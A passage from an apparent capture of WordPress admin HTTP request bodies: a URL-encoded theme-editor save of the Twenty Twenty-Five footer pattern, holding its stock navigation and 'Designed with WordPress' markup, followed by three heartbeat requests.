+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%09%09%09%09%3C!--+%2Fwp%3Anavigation+--%3E%0A%0A%09%09%09%09%3C!--+wp%3Anavigation+%7B%22overlayMenu%22%3A%22never%22%2C%22layout%22%3A%7B%22type%22%3A%22flex%22%2C%22orientation%22%3A%22vertical%22%7D%7D+--%3E%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'Events'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'Shop'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'Patterns'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%0A%09%09%09%09%09%3C!--+wp%3Anavigation-link+%7B%22label%22%3A%22%3C%3Fphp+esc_html_e(+'Themes'%2C+'twentytwentyfive'+)%3B+%3F%3E%22%2C%22url%22%3A%22%23%22%7D+%2F--%3E%0A%09%09%09%09%3C!--+%2Fwp%3Anavigation+--%3E%0A%09%09%09%3C%2Fdiv%3E%0A%09%09%09%09%3C!--+%2Fwp%3Agroup+--%3E%0A%09%09%3C%2Fdiv%3E%0A%09%09%3C!--+%2Fwp%3Agroup+--%3E%0A%0A%09%09%3C!--+wp%3Aspacer+%7B%22height%22%3A%22var%3Apreset%7Cspacing%7C70%22%7D+--%3E%0A%09%09%3Cdiv+style%3D%22height%3Avar(--wp--preset--spacing--70)%22+aria-hidden%3D%22true%22+class%3D%22wp-block-spacer%22%3E%3C%2Fdiv%3E%0A%09%09%3C!--+%2Fwp%3Aspacer+--%3E%0A%0A%09%09%3C!--+wp%3Agroup+%7B%22align%22%3A%22full%22%2C%22style%22%3A%7B%22spacing%22%3A%7B%22blockGap%22%3A%22var%3Apreset%7Cspacing%7C20%22%7D%7D%2C%22layout%22%3A%7B%22type%22%3A%22flex%22%2C%22flexWrap%22%3A%22wrap%22%2C%22justifyContent%22%3A%22space-between%22%7D%7D+--%3E%0A%09%09%3Cdiv+class%3D%22wp-block-group+alignfull%22%3E%0A%09%09%09%3C!--+wp%3Aparagraph+%7B%22fontSize%22%3A%22small%22%7D+--%3E%0A%09%09%09%3Cp+class%3D%22has-small-font-size%22%3E%3C%3Fphp+esc_html_e(+'Twenty+Twenty-Five'%2C+'twentytwentyfive'+)%3B+%3F%3E%3C%2Fp%3E%0A%09%09%09%3C!--+%2Fwp%3Aparagraph+--%3E%0A%09%09%09%3C!--+wp%3Aparagraph+%7B%22fontSize%22%3A%22small%22%7D+--%3E%0A%09%09%09%3Cp+class%3D%22has-small-font-size%22%3E%0A%09%09%09%09%3C%3Fphp%0A%09%09%09%09printf(%0A%09%09%09%09%09%2F*+translators%3A+Designed+with+WordPress.+%25s%3A+WordPress+link.+*%2F%0A%09%09%09%09%09esc_html__(+'Designed+with+%25s'%2C+'twentytwentyfive'+)%2C%0A%09%09%09%09%09'%3Ca+href%3D%22'+.+esc_url(+__(+'https%3A%2F%2Fwordpress.org'%2C+'twentytwentyfive'+)+)+.+'%22+rel%3D%22nofollow%22%3EWordPress%3C%2Fa%3E'%0A%09%09%09%09)%3B%0A%09%09%09%09%3F%3E%0A%09%09%09%3C%2Fp%3E%0A%09%09%09%3C!--+%2Fwp%3Aparagraph+--%3E%0A%09%09%3C%2Fdiv%3E%0A%09%09%3C!--+%2Fwp%3Agroup+--%3E%0A%09%3C%2Fdiv%3E%0A%09%3C!--+%2Fwp%3Agroup+--%3E%0A%3C%2Fdiv%3E%0A%3C!--+%2Fwp%3Agroup+--%3E%0A&action=edit-theme-plugin-file&file=patterns%2Ffooter.php&theme=twentytwentyfive&docs-list=
+
+--- Corps #38 ---
+interval=60&_nonce=27d2ce2949&action=heartbeat&screen_id=theme-editor&has_focus=false
+
+--- Corps #39 ---
+interval=60&_nonce=27d2ce2949&action=heartbeat&screen_id=dashboard&has_focus=false
+
+--- Corps #40 ---
+interval=60&_nonce=27d2ce2949&action=heartbeat&screen_id=theme-editor&has_focus=false
+
